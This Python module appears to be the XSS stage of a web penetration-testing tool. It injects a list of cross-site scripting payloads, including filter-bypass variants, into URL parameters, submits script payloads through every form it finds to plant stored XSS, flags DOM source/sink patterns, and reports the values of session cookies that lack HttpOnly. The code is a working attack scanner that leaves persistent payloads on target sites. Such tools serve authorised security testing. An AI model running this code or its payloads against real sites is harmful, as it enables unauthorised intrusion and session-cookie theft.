import random
import re
import string
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

COMMON_PARAMS = ["q", "search", "query", "id", "name", "page", "category",
                  "comment", "message", "redirect", "url", "ref", "next", "s"]

DOM_SINK_PATTERNS = [
    r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"document\.write\s*\(",
    r"document\.writeln\s*\(", r"\.insertAdjacentHTML\s*\(", r"eval\s*\(",
    r"setTimeout\s*\(\s*[\"']", r"setInterval\s*\(\s*[\"']",
    r"\$\([^)]*\)\.html\s*\(",
]
DOM_SOURCE_PATTERNS = [
    r"location\.hash", r"location\.search", r"location\.href",
    r"document\.referrer", r"window\.name", r"document\.URL",
]


def _token():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def payload_templates(token):
    marker = f"xsscat{token}"
    return [
        (f"<script>alert('{marker}')</script>", "basic_script_tag"),
        (f"<svg onload=alert('{marker}')>", "svg_onload"),
        (f"<img src=x onerror=alert('{marker}')>", "img_onerror"),
        (f"\"><script>alert('{marker}')</script>", "attribute_breakout"),
        (f"'><script>alert('{marker}')</script>", "attribute_breakout_single_quote"),
        (f"<body onload=alert('{marker}')>", "body_onload"),
        (f"<iframe src=\"javascript:alert('{marker}')\"></iframe>", "iframe_javascript_uri"),
        (f"<details open ontoggle=alert('{marker}')>", "details_ontoggle"),
        (f"<ScRiPt>alert('{marker}')</sCriPt>", "case_variation"),
        (f"<svg/onload=alert('{marker}')>", "no_space_svg"),
        (f"<input onfocus=alert('{marker}') autofocus>", "autofocus_onfocus"),
        (f"<marquee onstart=alert('{marker}')>", "marquee_onstart"),
        (f"<<script>script>alert('{marker}')<</script>/script>", "nested_tag_bypass"),
    ]


def _get(url, timeout=8, **kwargs):
    kwargs.setdefault("allow_redirects", True)
    try:
        return requests.get(url, timeout=timeout, verify=False, **kwargs)
    except requests.RequestException:
        return None


def classify_reflection_context(html, payload):
    idx = html.find(payload)
    if idx == -1:
        return "not_found"
    window_start = max(0, idx - 80)
    before = html[window_start:idx]
    if re.search(r"<script[^>]*>[^<]*$", before, re.IGNORECASE | re.DOTALL):
        return "script_block"
    if re.search(r"<!--[^>]*$", before, re.DOTALL):
        return "html_comment"
    if re.search(r'=["\'][^"\']*$', before):
        return "html_attribute"
    return "html_body"


def build_test_url(base_url, param, payload):
    parsed = urlparse(base_url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def scan_reflected(target_url, report=None):
    findings = []
    parsed = urlparse(target_url)
    existing_params = list(parse_qs(parsed.query).keys())
    params_to_test = sorted(set(existing_params + COMMON_PARAMS))

    for param in params_to_test:
        token = _token()
        for payload, category in payload_templates(token):
            marker = f"xsscat{token}"
            test_url = build_test_url(target_url, param, payload)
            resp = _get(test_url)
            if not resp or not resp.text:
                continue
            if payload in resp.text:
                context = classify_reflection_context(resp.text, payload)
                severity = "CRITICAL" if context in ("html_body", "html_attribute") else "HIGH"
                finding = {
                    "type": "reflected", "url": test_url, "param": param,
                    "payload": payload, "bypass_category": category, "context": context,
                }
                findings.append(finding)
                if report:
                    report.add_finding(
                        "XSS Exploitation",
                        f"Reflected XSS confirmed in parameter '{param}' ({category})",
                        f"URL: {test_url} | Payload: {payload} | Reflection context: {context}",
                        severity, vuln_id="xss_reflected",
                    )
                break
            elif marker in resp.text:
                findings.append({
                    "type": "reflected_partial", "url": test_url, "param": param,
                    "payload": payload, "bypass_category": category,
                })
                if report:
                    report.add_finding(
                        "XSS Exploitation",
                        f"Partial XSS reflection (filtered) in parameter '{param}'",
                        f"URL: {test_url} | Payload: {payload} | Marker reflected but payload "
                        "appears to have been partially sanitized - try additional bypass variants manually",
                        "MEDIUM",
                    )
    if not findings and report:
        report.add_finding("XSS Exploitation", "No reflected XSS found in tested parameters",
                            f"Tested parameters: {', '.join(params_to_test)} on {target_url}", "INFO")
    return findings


def discover_forms(page_url):
    resp = _get(page_url)
    if not resp:
        return []
    soup = BeautifulSoup(resp.text or "", "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action") or page_url
        action = urljoin(page_url, action)
        method = (form.get("method") or "get").lower()
        fields = {}
        for inp in form.find_all(["input", "textarea"]):
            name = inp.get("name")
            if not name:
                continue
            itype = (inp.get("type") or "text").lower()
            if itype in ("submit", "button", "checkbox", "radio", "file", "password"):
                fields[name] = inp.get("value", "")
            else:
                fields[name] = None
        forms.append({"action": action, "method": method, "fields": fields})
    return forms


def scan_stored(page_url, report=None):
    findings = []
    forms = discover_forms(page_url)
    for form in forms:
        text_fields = [name for name, val in form["fields"].items() if val is None]
        if not text_fields:
            continue
        token = _token()
        marker = f"xsscat{token}"
        payload = f"<script>alert('{marker}')</script>"

        submission = {name: (form["fields"][name] or "") for name in form["fields"]}
        for field in text_fields:
            submission[field] = payload

        try:
            if form["method"] == "post":
                requests.post(form["action"], data=submission, timeout=8, verify=False)
            else:
                requests.get(form["action"], params=submission, timeout=8, verify=False)
        except requests.RequestException:
            continue

        for check_url in (page_url, form["action"]):
            resp = _get(check_url)
            if not resp or not resp.text:
                continue
            if payload in resp.text:
                context = classify_reflection_context(resp.text, payload)
                findings.append({"type": "stored", "url": check_url, "form_action": form["action"],
                                  "payload": payload, "context": context})
                if report:
                    report.add_finding(
                        "XSS Exploitation",
                        f"Stored XSS confirmed via form at {form['action']}",
                        f"Submitted to: {form['action']} | Rendered unescaped at: {check_url} | "
                        f"Payload: {payload} | Context: {context}",
                        "CRITICAL", vuln_id="xss_stored",
                    )
                break

    if not findings and report and forms:
        report.add_finding("XSS Exploitation", "No stored XSS found in discovered forms",
                            f"Tested {len(forms)} form(s) on {page_url}", "INFO")
    return findings


def scan_dom(page_url, report=None):
    resp = _get(page_url)
    if not resp:
        return []
    soup = BeautifulSoup(resp.text or "", "html.parser")
    scripts = [tag.string or "" for tag in soup.find_all("script") if not tag.get("src")]

    src_scripts = []
    for tag in soup.find_all("script", src=True):
        script_url = urljoin(page_url, tag["src"])
        script_resp = _get(script_url)
        if script_resp and script_resp.text:
            src_scripts.append((script_url, script_resp.text))

    findings = []
    all_blocks = [(page_url, s) for s in scripts] + src_scripts
    for source_location, code in all_blocks:
        if not code:
            continue
        has_sink = any(re.search(p, code) for p in DOM_SINK_PATTERNS)
        has_source = any(re.search(p, code) for p in DOM_SOURCE_PATTERNS)
        if has_sink and has_source:
            matched_sink = next(p for p in DOM_SINK_PATTERNS if re.search(p, code))
            matched_source = next(p for p in DOM_SOURCE_PATTERNS if re.search(p, code))
            findings.append({"type": "dom_suspected", "location": source_location,
                              "sink": matched_sink, "source": matched_source})
            if report:
                report.add_finding(
                    "XSS Exploitation",
                    f"Potential DOM-based XSS in {source_location}",
                    f"Attacker-controllable source matching '{matched_source}' flows into a "
                    f"dangerous sink matching '{matched_sink}'. Static detection only - "
                    "manually confirm by crafting a URL that reaches the sink.",
                    "HIGH", vuln_id="xss_dom_suspected",
                )

    if not findings and report:
        report.add_finding("XSS Exploitation", "No obvious DOM XSS sink/source patterns found",
                            f"Inspected {len(all_blocks)} script block(s) on {page_url}", "INFO")
    return findings


def demonstrate_session_impact(page_url, reflected_findings, report=None):
    if not reflected_findings:
        return None
    resp = _get(page_url)
    if not resp or not resp.cookies:
        return None

    exposed = []
    for cookie in resp.cookies:
        has_httponly = "httponly" in [k.lower() for k in cookie._rest.keys()] if hasattr(cookie, "_rest") else False
        if not has_httponly:
            exposed.append({"name": cookie.name, "value": cookie.value})

    if exposed and report:
        detail = ", ".join(f"{c['name']}={c['value']}" for c in exposed)
        report.add_finding(
            "XSS Exploitation",
            "Confirmed XSS could exfiltrate session cookie(s) (missing HttpOnly)",
            f"Since a confirmed XSS exists and these cookies lack HttpOnly, an injected "
            f"'document.cookie' read in a victim's browser would return: {detail}",
            "CRITICAL",
        )
    return exposed or None


def try_confirm_with_browser(url):
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
    except ImportError:
        return None

    marker = _token()
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    driver = None
    try:
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(10)
        driver.get(url)
        return marker in driver.title
    except Exception:
        return None
    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass


def run(target, scheme="http", port=None, dir_hits=None, report=None):
    base_url = f"{scheme}://{target}"
    if port and port not in (80, 443):
        base_url += f":{port}"

    pages = {base_url}
    if dir_hits:
        for hit in dir_hits[:15]:
            pages.add(hit["url"])

    reflected_all = []
    for page in pages:
        reflected_all.extend(scan_reflected(page, report=report))

    stored_all = []
    for page in pages:
        stored_all.extend(scan_stored(page, report=report))

    dom_all = scan_dom(base_url, report=report)

    all_confirmed = [f for f in reflected_all if f["type"] == "reflected"] + stored_all
    demonstrate_session_impact(base_url, all_confirmed, report=report)

    return {
        "reflected": reflected_all,
        "stored": stored_all,
        "dom": dom_all,
    }
